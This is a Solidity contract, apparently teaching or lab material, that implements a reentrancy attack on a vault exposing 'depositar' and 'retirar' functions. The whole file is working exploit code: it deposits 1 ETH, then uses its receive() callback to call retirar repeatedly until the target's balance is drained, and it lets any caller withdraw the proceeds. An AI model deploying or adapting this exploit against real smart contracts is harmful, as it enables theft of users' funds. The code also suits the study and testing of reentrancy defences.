// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBovedaVulnerable {
    function depositar() external payable;
    function retirar(uint256) external;
}

contract AtacanteReentrancy {
    IBovedaVulnerable public target;
    uint256 public constant MONTO_DEPOSITO = 1 ether;
    uint256 public llamadasReceive;

    constructor(address _target) {
        target = IBovedaVulnerable(_target);
    }

    function ejecutarAtaque() external payable {
        require(msg.value == MONTO_DEPOSITO, "Se requiere exactamente 1 ETH");
        target.depositar{value: MONTO_DEPOSITO}();
        target.retirar(MONTO_DEPOSITO);
    }

    receive() external payable {
        llamadasReceive++;
        uint256 saldoVictima = address(target).balance;
        if (saldoVictima >= MONTO_DEPOSITO) {
            target.retirar(MONTO_DEPOSITO);
        }
    }

    function retirarFondos() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
